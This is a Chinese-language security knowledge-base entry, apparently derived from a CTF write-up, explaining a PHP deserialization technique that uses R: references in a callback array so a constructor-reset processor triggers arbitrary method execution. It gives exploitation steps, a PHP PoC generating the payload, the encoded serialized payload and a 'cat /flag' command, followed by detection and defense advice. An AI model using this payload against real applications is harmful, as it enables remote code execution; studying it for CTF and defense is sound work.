---
id: web-php-deserialization-reference-callback-array-constructor-reset
title: PHP 反序列化引用 R 绑定回调数组：__construct 重置 processor 后 action[0] 跟随引用执行任意方法
type: scenario
domain: web
path: web/php/deserialization
technique: php-unserialize-reference-callback-array
tags:
- php
- deserialization
- reference
- r-reference
- callback-array
- pop-chain
- construct
- ctf
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V161
  verified_at: '2026-11-06T13:49:34+08:00'
  notes: 已对照原文核对：RequestHandler 类结构、array(&$processor,"execute") 引用绑定、外层 action 调 __construct 的 payload 与原文逐字一致；原文未给出方法体，构造器重置细节按注释与 payload 行为推断；PoC 未在本机执行。
url: /docs/web/php/deserialization/web-php-deserialization-reference-callback-array-constructor-reset/
draft: false
kb_aliases:
- 'R: 引用反序列化'
- 回调数组引用绑定
- __construct 重置 processor
- RequestHandler 反序列化
- PHP POP 引用技巧
---

## 一句话结论

PHP 反序列化允许用 `R:n`（或 `r:n`）把数组元素绑定为对另一属性的引用；攻击者先让 `action = [&$processor, "execute"]` 指向 `processor`，再让外层 `action` 调用目标的 `__construct`，后者把 `processor` 重新赋值为攻击者可控对象，`action[0]` 因引用同步变成该对象，最终以 `execute` 方法触发任意调用链。

## 原理

- **引用是序列化格式的一部分**：`serialize()` 遇到引用会输出 `R:n`（对象引用）或 `r:n`（值引用），反序列化时恢复为同一 zval 的别名；这意味着两个属性/数组元素可以指向同一块内存。
- **回调数组**：PHP 的 callable 形式 `[$object, "method"]` 在反序列化后仍是数组；若第一个元素是对 `$this->processor` 的引用，后续对 `processor` 的赋值会同步反映到 `action[0]`。
- **构造器重置**：目标类的 `__construct` 会把 `$this->processor` 替换为新对象（例如带命令的执行器），并把 `$this->action` 设为 `[$this->processor, "execute"]`。若攻击者用引用预先绑定了 `action[0]`，构造器执行后 `action[0]` 自动指向新 processor。
- **触发链**：外层对象的 `action` 设为 `[$inner, "__construct"]`，反序列化/析构/显式调用时执行 `$inner->__construct()`；内层构造器重置 processor，随后内层 `action` 的 `execute` 被调用，最终执行攻击者对象的方法（如 `system($cmd)`）。
- **为什么引用是关键**：普通数组在序列化时保存的是当时对象的副本/引用计数；如果不使用 `R:`，`action[0]` 仍指向旧 processor，构造器替换后不会跟随，链断。
- **前提**：应用对不可信数据调用 `unserialize()` 且未限制类；目标类存在可被构造器重置的 callable 属性。

## 触发条件

- 应用存在 `unserialize($_GET/$_POST/...)` 或等价的反序列化入口，且未使用 `allowed_classes` 白名单。
- 可利用的类包含 `__construct`/`__wakeup`/`__destruct`，其中会把某个属性重新赋值为可控对象或 callable。
- 存在 `[$this->prop, "method"]` 形式的回调数组，且 `prop` 可被引用绑定。
- PHP 版本支持 `R:`/`r:` 引用反序列化（PHP 5/7/8 均支持）。

## 利用步骤

1. 阅读目标类，找到 `__construct`/`__wakeup` 中会重置 callable 属性的逻辑。
2. 构造内层对象 B：`$b->processor = null; $b->action = array(&$b->processor, "execute");`，让 `action[0]` 成为 `processor` 的引用。
3. 构造外层对象 A：`$a->processor = null; $a->action = array($b, "__construct");`，使反序列化后触发 B 的构造器。
4. `serialize($a)` 得到含 `R:` 的 payload，URL 编码后发送。
5. B 的 `__construct` 重置 `processor` 为攻击者对象（如带命令的执行器），`action[0]` 跟随引用；B 的 `execute` 被调用，执行命令/读取 flag。
6. 若触发点不是构造器，可换 `__wakeup`、`__destruct` 或显式方法调用，保持“引用绑定 + 属性重置”的结构。

## PoC

```php
<?php
class RequestHandler {
    public $processor;
    public $action;
}

$b = new RequestHandler();
$b->processor = null;
$b->action = array(&$b->processor, "execute");   // action[0] 引用 processor

$a = new RequestHandler();
$a->processor = null;
$a->action = array($b, "__construct");           // 触发 B 的构造器

echo urlencode(serialize($a));
```

生成的 payload 形如：

```text
O%3A14%3A%22RequestHandler%22%3A2%3A%7Bs%3A9%3A%22processor%22%3BN%3Bs%3A6%3A%22action%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A14%3A%22RequestHandler%22%3A2%3A%7Bs%3A9%3A%22processor%22%3BN%3Bs%3A6%3A%22action%22%3Ba%3A2%3A%7Bi%3A0%3BR%3A5%3Bi%3A1%3Bs%3A7%3A%22execute%22%3B%7D%7Di%3A1%3Bs%3A11%3A%22__construct%22%3B%7D%7D
```

实际类名、属性名、构造器行为需按目标代码替换；文章用该 payload 配合 `&cmd=cat /flag` 得到 flag。

## 变体与关联

- 变体：`r:` 值引用与 `R:` 对象引用的差异；数组内部引用、对象属性引用、`ArrayObject` 等容器。
- 变体：把触发点从 `__construct` 换成 `__wakeup`/`__destruct`/`__toString`，或利用 `call_user_func`/`array_map` 等回调 sink。
- 变体：结合属性导向编程（POP）链，把引用绑定到 `__call`/`__invoke` 的可控对象，扩大可达方法。
- 关联：[[web-php-deserialization-multi-destruct-anonymous-class-global-function-chain]]（多析构匿名类链）、[[web-php-deserialization-pickle-codetype-function-hijack]]（跨语言函数劫持）、[[web-php-rce-eval-getallheaders-no-param-function-call]]（动态 callable 执行）。

## 检测与防御

- 防御：不要对不可信数据使用 `unserialize()`；改用 JSON/`json_decode`；必须使用时设置 `allowed_classes` 白名单并校验结构。
- 防御：避免在 `__construct`/`__wakeup` 中把属性重置为可执行对象；不要用用户可控数据构造 callable。
- 检测：请求参数中出现 `O:`、`a:`、`R:`、`r:` 等序列化特征；反序列化后的对象属性被意外重置；日志中出现 `__construct`/`__destruct` 触发的异常调用。
- 响应：隔离应用，审计反序列化入口，清理恶意 payload/缓存，轮换可能泄露的凭据。
